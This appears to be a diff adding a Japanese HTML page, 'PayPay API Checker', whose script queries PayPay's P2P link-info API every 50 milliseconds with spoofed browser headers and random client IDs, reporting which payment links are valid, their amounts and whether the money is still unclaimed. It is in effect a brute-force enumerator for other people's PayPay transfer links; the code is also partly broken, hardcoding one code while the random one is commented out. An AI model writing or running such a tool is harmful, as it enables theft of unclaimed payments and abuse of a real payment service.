@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PayPay API Checker</title>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script>
+        function generateRandomString(length) {
+            const characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
+            let randomString = '';
+            for (let i = 0; i < length; i++) {
+                const randomIndex = Math.floor(Math.random() * characters.length);
+                randomString += characters.charAt(randomIndex);
+            }
+            return randomString;
+        }
+
+        async function checkP2PLink(apiUrl, verificationCode) {
+            try {
+                const response = await fetch(apiUrl, {
+                    method: 'GET',
+                    headers: {
+                        'User-Agent': 'Mozilla/5.0 Chrome/109.0.0.0 Safari/537.36',
+                        'Content-Type': 'application/json'
+                    }
+                });
+
+                const httpCode = response.status;
+
+                if (httpCode === 429) {
+                    $("#inValid").append("<p>レートリミットのため、数秒待機しています...</p>");
+                    return;
+                }
+
+                const data = await response.json();
+
+                if (data.header.resultCode === 'S0000') {
+                    const validLink = `https://pay.paypay.ne.jp/${verificationCode}`;
+                    let validMessage;
+
+                    if (data.payload.orderStatus === 'PENDING') {
+                        validMessage = `有効: ${validLink} <br> 金額: ${data.payload.pendingP2PInfo.amount} まだ受け取られていません`;
+                    } else {
+                        validMessage = `有効: ${validLink} 金額: ${data.payload.pendingP2PInfo.amount} すでに受け取られています`;
+                    }
+
+                    $("#Valid").append("<p>" + validMessage + "</p>");
+                } else {
+                    const invalidLink = `https://pay.paypay.ne.jp/${verificationCode}`;
+                    const invalidMessage = `無効なリンク: ${invalidLink}`;
+                    $("#inValid").append("<p>" + invalidMessage + "</p>");
+                }
+            } catch (error) {
+                console.error(`エラーが発生しました: ${error.message}`);
+                $("#inValid").append("<p>エラーが発生しました。</p>",ll);
+            }
+        }
+ll='';
+        function a() {
+            let client_uuid = generateRandomString(8) + '-' + generateRandomString(4) + '-' + generateRandomString(4) + '-' + generateRandomString(12);
+            let verificationCode = generateRandomString(16);
+            let link = `https://www.paypay.ne.jp/app/v2/p2p-api/getP2PLinkInfo?verificationCode=OF6lr5kQNmkV7ncX&client_uuid=${client_uuid}`;//${verificationCode}
+ll = link;
+            checkP2PLink(link, verificationCode);
+        }
+
+        setInterval(a, 50);
+
+        window.onload = function() {
+            var imgTags = document.getElementsByTagName("img");
+            if (imgTags.length >= 2) {
+                imgTags[imgTags.length - 2].style.display = "none";
+            }
+            if (imgTags.length >= 1) {
+                imgTags[imgTags.length - 1].style.display = "none";
+            }
+        };
+    </script>
+</head>
+<body>
+    <h1>PayPay API Checker</h1>
+    <div id="Valid"></div>
+    <div id="inValid"></div>
+    <img src="image1.jpg" alt="Image 1">
+    <img src="image2.jpg" alt="Image 2">
+    <img src="image3.jpg" alt="Image 3">
+</body>
+</html>
